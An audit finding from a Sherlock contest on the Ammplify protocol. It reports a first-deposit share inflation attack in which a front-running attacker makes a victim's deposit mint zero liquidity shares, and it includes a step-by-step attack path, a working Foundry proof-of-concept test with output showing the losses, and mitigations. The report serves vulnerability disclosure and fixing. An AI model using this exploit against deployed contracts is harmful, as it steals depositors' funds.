---
tags:
  - lang/solidity
  - sector/dex
  - sector/lending
  - sector/vault
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - impact/mev/frontrun
  - trigger/first-deposit
protocol: "[[Ammplify]]"
auditors:
  - "[[HeckerTrieuTien]]"
  - "[[OxNoble]]"
  - "[[panprog]]"
report: "https://github.com/sherlock-audit/2025-09-ammplify-judging"
genome:
  - "[[rounding-direction]]"
  - "[[frontrun]]"
  - "[[first-deposit]]"
  - "[[frontrun-exposure]]"
  - "[[integer-bounds]]"
---
# H-6: User can lose all funds when creating or increasing compounded Maker position due to share inflation first deposit attack in any segment of the user's range

- id: 63172
- impact: HIGH
- protocol: [[Ammplify]]
- reporter: panprog (Sherlock)
- source: N/A

## Summary


This bug report discusses a vulnerability in the Ammplify protocol that allows an attacker to steal all the funds deposited by a user in a specific liquidity range. The vulnerability is caused by rounding down the share price minted to the user, which can be exploited by an attacker through a series of transactions. The impact of this vulnerability is that all funds can be stolen from a user depositing into a segment with zero liquidity. A proof of concept is provided to demonstrate the vulnerability and potential mitigations are suggested, such as adding virtual balances or enforcing a minimum liquidity shares balance.

## Details


Source: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/417 

## Found by 
HeckerTrieuTien, OxNoble, panprog

### Summary

Each segment in the Ammplify protocol functions as vault for compounded Makers. This makes the classic first deposit share inflation attack possible for any range which doesn't have liquidity yet:
- User wants to deposit liquidity into some range
- There is no Ammplify Maker liquidity in some segment of the range (or all range)
- Attacker front-runs the deposit with minimum deposit, donates to uniswap liquidity range to increase liquidity share price
- User deposit proceeds, taking necessary amounts of token0 / token1 from the user, but minting user 0 liquidity shares due to rounding (liquidity owed to user is less than 1 and thus rounded down). Uniswap liquidity itself is still minted, but it now belongs to the "vault" (attacker)

As a result, attacker steals all the deposit of the user with user getting 0 liquidity shares for his assets, losing all deposited funds.

Moreover, the attack is more severe compared to traditional vault, because there are a lot of different segments in the Ammplify liquidity and each of them can be used to steal first deposit funds separately from the other segments.

Note, that there is some protection by enforcing minimum target liquidity. However, it is not effective and can be bypassed, because it targets liquidity itself, not liquidity shares. This means that after depositing minimum liquidity and doing donation to the pool range, the liquidity share price increases by orders of magnitude. Adjusting maker position will re-target the liquidity, reducing liquidity shares down to 1 (for example: if liquidity share price = 1e10, a target liquidity of 1e10, which passes minimum liquidity check, sets target liquidity shares to 1). After that another donation can make liquidity share price arbitrarily large: a donation of user's deposit amount + 1 wei is enough to have user's liquidity shares round down to 0 to steal his deposit.

### Root Cause

Rounding down share price minted to user (compounding liquidity can be donated to inflate liquidity share price):
https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L260-L263

Minimum target liquidity is enforced, while minimum liquidity shares are not enforced:
https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Maker.sol#L31

### Internal Pre-conditions

0 liquidity in any segment where liquidity being deposited by user will be minted.

### External Pre-conditions

None.

### Attack Path

Attacker spots the user's transaction to deposit compounded maker liquidity into a range with 0 current liquidity (for example, 300e18 liquidity) and front-runs this deposit with the following transaction:
- Attacker deposits minimum compounded maker liquidity in the same range: for example, 1e6
- Attacker donates to uniswap pool in the range (if necessary, moves the current price inside the range, then uses `pool.flash(0,0)` and sends whatever amount of tokens he wants to donate): for example, 1e18 of each token
- At this point the liquidity share price will be inflated: in the example, to 33e13 (full liquidity of attacker is now `33e13 * 1e6 = 330e18`)
- Attacker adjusts his maker position to slightly above current share price: 40e13. His position (and the range node) has now 1 liquidity share.
- Attacker donates the amount of tokens which the user is going to deposit: 1e18 of each token
- Share price increases to 330e18

Now attacker lets the user's transaction proceed
- Node liquidity is increased by 300e18, but user is minted 0 liquidity shares, because liquidity of 300e18 is below 1 liquidity share which is worth 330e18
- Liquidity share price increases to 630e18 (because there is still 1 liquidity share in the range, and extra 300e18 liquidity was minted along with 0 shares)
- Attacker can now close his position to receive all user's deposited liquidity, stealing it from the user

### Impact

All funds can be stolen from the user depositing into segment with 0 liquidity

### Proof of concept

Add this test to `Maker.t.sol`:
```solidity
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        token0.transfer(msg.sender, 1e18+1);
        token1.transfer(msg.sender, 1e18+1);
    }

    function testFirstDepositorDrain() public {
        bytes memory rftData = "";

        address victim = makeAddr("victimUser");
        vm.label(victim, "victimUser");

        lowTick = 600;
        highTick = 720;

        // set current price to the middle of the interval
        swapTo(0, TickMath.getSqrtRatioAtTick(630));

        uint256 assetId = makerFacet.newMaker(
            recipient,
            poolAddr,
            lowTick,
            highTick,
            1e6, // minimum liquidity
            true, // compounding
            minSqrtPriceX96,
            maxSqrtPriceX96,
            rftData
        );

        // donate some amount to compound liquidity
        UniswapV3Pool(poolAddr).flash(address(this), 0, 0, "");

        // reduce liquidity shares
        makerFacet.adjustMaker(recipient, assetId, 4e14, minSqrtPriceX96, maxSqrtPriceX96, rftData);

        // donate again
        UniswapV3Pool(poolAddr).flash(address(this), 0, 0, "");

        // mint new user who should get 0 shares
        vm.startPrank(victim);
        MockERC20(token0).mint(victim, 2e18);
        MockERC20(token1).mint(victim, 2e18);
        uint balVictim0 = token0.balanceOf(victim);
        uint balVictim1 = token1.balanceOf(victim);
        console2.log("victim balance before: ", balVictim0, balVictim1);
        MockERC20(token0).approve(diamond, type(uint256).max);
        MockERC20(token1).approve(diamond, type(uint256).max);
        uint256 assetId2 = makerFacet.newMaker(
            victim,
            poolAddr,
            lowTick,
            highTick,
            300e18,
            true, // compounding
            minSqrtPriceX96,
            maxSqrtPriceX96,
            rftData
        );        

        // now close victim position to see how much he gets back
        makerFacet.removeMaker(victim, assetId2, minSqrtPriceX96, maxSqrtPriceX96, rftData);
        vm.stopPrank();

        uint balVictim0After = token0.balanceOf(victim);
        uint balVictim1After = token1.balanceOf(victim);
        console2.log("victim balance after: ", balVictim0After, balVictim1After);
        console2.log("victim balance loss: ", balVictim0 - balVictim0After, balVictim1 - balVictim1After);
    }
```

The test output:

```solidity
  victim balance before:  2000000000000000000 2000000000000000000
  victim balance after:  694864162251284872 1535971421840461598
  victim balance loss:  1305135837748715128 464028578159538402
```

### Mitigation

Some possible mitigations include:
- "virtual" balances added to all liquidity during calculations similar to openzeppelin's ERC4626 implementations (a dust loss is expected for the users who deposit and withdraw due to virtual balances, but it prevents large inflations of the share price)
- enforce minimum liquidity shares balance (along with liquidity) of the node and/or account's asset node
